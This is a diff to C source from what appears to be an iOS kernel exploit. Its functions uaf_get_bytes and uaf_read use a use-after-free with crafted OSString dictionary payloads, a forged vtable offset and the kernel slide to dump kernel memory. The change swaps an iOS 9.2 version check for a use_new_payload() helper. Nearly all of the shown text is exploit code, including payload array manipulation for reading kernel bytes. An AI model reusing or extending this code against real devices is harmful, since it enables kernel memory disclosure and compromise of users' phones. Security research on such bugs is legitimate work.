@@ -7,9 +7,8 @@
 #include <mach/vm_prot.h>       // VM_PROT_EXECUTE
 
 #include "common.h"             // ASSERT, DEBUG, PRINT_BUF, TIMER_*, MIN, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
-#include "device.h"             // V_*, get_os_version
 #include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
-#include "offsets.h"            // off_vtab
+#include "offsets.h"            // off_vtab, use_new_payload
 #include "slide.h"              // get_kernel_slide
 #include "try.h"                // THROW, TRY, RETHROW, FINALLY
 
@@ -27,7 +26,7 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
                ref[] = "ref",
                sav[] = "sav";
 
-    if(get_os_version() >= V_13C75) // 9.2
+    if(use_new_payload())
     {
         uint32_t dict_92[] =
         {
@@ -288,14 +287,14 @@ void uaf_read(const char *addr, char *buf, size_t len)
 
     DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));
 
-    uint32_t version = get_os_version();
+    bool newpayload = use_new_payload();
 
     // Once
     if(vtab == NULL)
     {
         vtab = (vtab_t)off_vtab();
         uint32_t *data = (uint32_t*)&vtab;
-        if(version >= V_13C75) // 9.2
+        if(newpayload)
         {
 #ifdef __LP64__
             dict_92[DICT_HEAD + 11] = dict_92[DICT_HEAD + (STR_LEN + 1) + 11] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 11] = data[0];
@@ -346,7 +345,7 @@ void uaf_read(const char *addr, char *buf, size_t len)
 
                     off += cl_len;
 
-                    if(version >= V_13C75) // 9.2
+                    if(newpayload)
                     {
                         dict_92[6] = ((uint32_t*)&uoff)[0];
                         dict_92[7] = ((uint32_t*)&uoff)[1];
